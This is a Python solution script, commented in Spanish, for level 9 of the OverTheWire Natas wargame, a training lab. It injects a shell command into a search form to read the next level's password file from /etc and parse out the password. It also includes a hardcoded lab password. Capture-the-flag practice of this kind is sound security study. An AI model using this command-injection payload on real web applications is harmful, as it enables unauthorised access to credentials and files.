#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas09.py

Se puede inyectar codigo de shell directamente en el formulario;
basta con encontrar el fichero de contraseña para el usuario natas10 
"""
import libnatas

# url: "http://natas9.natas.labs.overthewire.org"
# user: "natas9"
password = "sQ6DKR8ICwqDMTd48lQlJfbF1q9B3edT"

natas = libnatas.NatasBrowser(level=9, password=password)

# el source-index.html muestra que se puede inyectar código en el formulario
# dictionary = natas.get_html_soup(natas.level_url + '/dictionary.txt')
# aunque no funciona del todo bien find, si navegamos por /etc/ encontramos un
# monton de ficheros de password, existe un par de ficheros con nombre natas9 y
# natas10 que contienten passswords, dado que el natas9 corresponde con la de
# este nivel, podemos extraer la del 10 inyectando::
#
# ; find /etc/ -iname "natas10"  -exec cat {}  \;; 
#

inject = r'''; find /etc/ -iname "natas10"  -exec cat {}  \;; ''' 


# reabrimos la pagina principal y rellenamos el formulario
natas.open(natas.level_url)
natas.select_form(nr=0) # primera form (y unica)
natas.form['needle'] = inject

html = natas.submit()
password_nl = natas.get_password(html.read(), '.*\W([a-zA-Z0-9]{32})\W.*')
natas.print_password(password_nl)

